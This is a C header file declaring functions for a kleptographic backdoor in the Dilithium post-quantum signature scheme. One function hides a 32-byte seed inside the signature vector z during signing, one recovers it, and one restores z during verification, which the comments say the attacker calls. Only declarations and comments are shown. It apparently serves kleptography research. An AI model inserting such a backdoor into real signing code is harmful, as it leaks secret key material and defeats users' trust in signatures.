#ifndef TRANSFORM_H
#define TRANSFORM_H

#include <stdio.h>
#include <stdint.h>
#include <sys/stat.h>
#include <string.h>

#include "params.h"
#include "polyvec.h"
#include "poly.h"
#include "fips202.h"

/*  
 * Kleptographic backdoor for Dilithium using space-reuse technique.
 *  
 * Embeds hidden_seed into the first 256 coefficients of z to match the
 * pre-SHAKE seed bits. The modification map is stored internally
 * and exfiltrated into the second polynomial.
 *  
 * Arguments:
 *   - polyvecl *z: 				Response vector (modifies vec[0] only; vec[1..L-1] are untouched).
 *   - const uint8_t *hidden_seed: 	32-byte pre-SHAKE seed.
 *  
 * Usage: Called during signature generation after computing z = y + c*s1
 *        and before norm checks in rejection sampling loop.
 */  
void pqcrystals_dilithium_backdoor_embed(polyvecl *z, const uint8_t *hidden_seed);

/*
 * Extracts the hidden pre-SHAKE seed from the first polynomial of z and the
 * change map from the second polynomial.
 * 
 * Arguments:
 *   - const polyvecl *z: 		The backdoored signature vector.
 *   - uint8_t *extracted_seed:	Output buffer (SEEDBYTES long).
 * 
 * Usage: Called after obtaining a signature to recover the hidden seed.
*/
void pqcrystals_dilithium_backdoor_recover(const polyvecl *z, uint8_t *extracted_seed);

/*
 * Restores z to its original state by regenerating it from hidden_seed.
 * Derives s1 (from keygen randomness), rhoprime_signing (from key+mu),
 * then iterates kappa until z_candidate.vec[1] matches z->vec[1].
 *
 * Arguments:
 *   - polyvecl *z:                  in: dirty z; out: fully restored z.
 *   - const uint8_t *hidden_seed:   recovered by pqcrystals_dilithium_backdoor_recover.
 *   - const uint8_t *mu:            CRH(H(pk) || pre || msg), from verify context. Used to derive rhoprime_signing for y generation.
 *   - const poly *cp:               challenge polynomial (coefficient domain), from verify.
 *
 * Usage: Called by the attacker inside crypto_sign_verify_internal.
*/
int pqcrystals_dilithium_backdoor_restore(
    polyvecl *z,
    const uint8_t *hidden_seed,
    const uint8_t *mu,
    const poly *cp);

#endif